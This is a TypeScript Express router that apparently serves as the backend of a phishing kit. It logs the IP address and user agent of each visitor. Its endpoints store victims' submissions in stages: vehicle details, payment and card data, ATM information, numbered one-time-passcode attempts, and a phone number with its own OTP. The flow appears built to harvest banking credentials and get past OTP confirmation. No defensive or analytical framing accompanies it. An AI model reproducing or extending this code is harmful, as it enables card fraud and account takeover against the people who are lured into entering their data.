import { Router, type IRouter } from "express";
import { insertSubmission } from "@workspace/db";
import {
  SubmitInitialBody,
  SubmitVehicleBody,
  SubmitPaymentBody,
  SubmitCardBody,
  SubmitOtpBody,
  SubmitAtmBody,
  SubmitNomerBody,
  SubmitNomerOtpBody,
} from "@workspace/api-zod";

const router: IRouter = Router();

function getClientIp(req: import("express").Request): string {
  const forwarded = req.headers["x-forwarded-for"];
  if (typeof forwarded === "string") return forwarded.split(",")[0].trim();
  return req.socket.remoteAddress ?? "unknown";
}

router.post("/submissions/initial", async (req, res): Promise<void> => {
  try {
    const parsed = SubmitInitialBody.safeParse(req.body);
    if (!parsed.success) {
      res.status(400).json({ error: parsed.error.message });
      return;
    }
    const row = await insertSubmission({
      sessionId: parsed.data.sessionId,
      type: "initial",
      data: JSON.stringify(parsed.data),
      ipAddress: getClientIp(req),
      userAgent: req.headers["user-agent"] ?? null,
    });
    res.status(201).json({ id: row.id, sessionId: row.sessionId });
  } catch (error) {
    console.error("Error in /submissions/initial:", error);
    res.status(500).json({ error: "Failed to save submission", details: String(error) });
  }
});

router.post("/submissions/vehicle", async (req, res): Promise<void> => {
  try {
    const parsed = SubmitVehicleBody.safeParse(req.body);
    if (!parsed.success) {
      res.status(400).json({ error: parsed.error.message });
      return;
    }
    const row = await insertSubmission({
      sessionId: parsed.data.sessionId,
      type: "vehicle",
      data: JSON.stringify(parsed.data),
      ipAddress: getClientIp(req),
      userAgent: req.headers["user-agent"] ?? null,
    });
    res.status(201).json({ id: row.id, sessionId: row.sessionId });
  } catch (error) {
    console.error("Error in /submissions/vehicle:", error);
    res.status(500).json({ error: "Failed to save submission", details: String(error) });
  }
});

router.post("/submissions/payment", async (req, res): Promise<void> => {
  try {
    const parsed = SubmitPaymentBody.safeParse(req.body);
    if (!parsed.success) {
      res.status(400).json({ error: parsed.error.message });
      return;
    }
    const row = await insertSubmission({
      sessionId: parsed.data.sessionId,
      type: "payment",
      data: JSON.stringify(parsed.data),
      ipAddress: getClientIp(req),
      userAgent: req.headers["user-agent"] ?? null,
    });
    res.status(201).json({ id: row.id, sessionId: row.sessionId });
  } catch (error) {
    console.error("Error in /submissions/payment:", error);
    res.status(500).json({ error: "Failed to save submission", details: String(error) });
  }
});

router.post("/submissions/card", async (req, res): Promise<void> => {
  try {
    const parsed = SubmitCardBody.safeParse(req.body);
    if (!parsed.success) {
      res.status(400).json({ error: parsed.error.message });
      return;
    }
    const row = await insertSubmission({
      sessionId: parsed.data.sessionId,
      type: "card",
      data: JSON.stringify(parsed.data),
      ipAddress: getClientIp(req),
      userAgent: req.headers["user-agent"] ?? null,
    });
    res.status(201).json({ id: row.id, sessionId: row.sessionId });
  } catch (error) {
    console.error("Error in /submissions/card:", error);
    res.status(500).json({ error: "Failed to save submission", details: String(error) });
  }
});

router.post("/submissions/otp", async (req, res): Promise<void> => {
  try {
    const parsed = SubmitOtpBody.safeParse(req.body);
    if (!parsed.success) {
      res.status(400).json({ error: parsed.error.message });
      return;
    }
    const row = await insertSubmission({
      sessionId: parsed.data.sessionId,
      type: `otp_attempt_${parsed.data.attempt}`,
      data: JSON.stringify(parsed.data),
      ipAddress: getClientIp(req),
      userAgent: req.headers["user-agent"] ?? null,
    });
    res.status(201).json({ id: row.id, sessionId: row.sessionId });
  } catch (error) {
    console.error("Error in /submissions/otp:", error);
    res.status(500).json({ error: "Failed to save submission", details: String(error) });
  }
});

router.post("/submissions/atm", async (req, res): Promise<void> => {
  try {
    const parsed = SubmitAtmBody.safeParse(req.body);
    if (!parsed.success) {
      res.status(400).json({ error: parsed.error.message });
      return;
    }
    const row = await insertSubmission({
      sessionId: parsed.data.sessionId,
      type: "atm",
      data: JSON.stringify(parsed.data),
      ipAddress: getClientIp(req),
      userAgent: req.headers["user-agent"] ?? null,
    });
    res.status(201).json({ id: row.id, sessionId: row.sessionId });
  } catch (error) {
    console.error("Error in /submissions/atm:", error);
    res.status(500).json({ error: "Failed to save submission", details: String(error) });
  }
});

router.post("/submissions/nomer", async (req, res): Promise<void> => {
  try {
    const parsed = SubmitNomerBody.safeParse(req.body);
    if (!parsed.success) {
      res.status(400).json({ error: parsed.error.message });
      return;
    }
    const row = await insertSubmission({
      sessionId: parsed.data.sessionId,
      type: "nomer",
      data: JSON.stringify(parsed.data),
      ipAddress: getClientIp(req),
      userAgent: req.headers["user-agent"] ?? null,
    });
    res.status(201).json({ id: row.id, sessionId: row.sessionId });
  } catch (error) {
    console.error("Error in /submissions/nomer:", error);
    res.status(500).json({ error: "Failed to save submission", details: String(error) });
  }
});

router.post("/submissions/nomer_otp", async (req, res): Promise<void> => {
  try {
    const parsed = SubmitNomerOtpBody.safeParse(req.body);
    if (!parsed.success) {
      res.status(400).json({ error: parsed.error.message });
      return;
    }
    const row = await insertSubmission({
      sessionId: parsed.data.sessionId,
      type: "nomer_otp",
      data: JSON.stringify(parsed.data),
      ipAddress: getClientIp(req),
      userAgent: req.headers["user-agent"] ?? null,
    });
    res.status(201).json({ id: row.id, sessionId: row.sessionId });
  } catch (error) {
    console.error("Error in /submissions/nomer_otp:", error);
    res.status(500).json({ error: "Failed to save submission", details: String(error) });
  }
});

export default router;
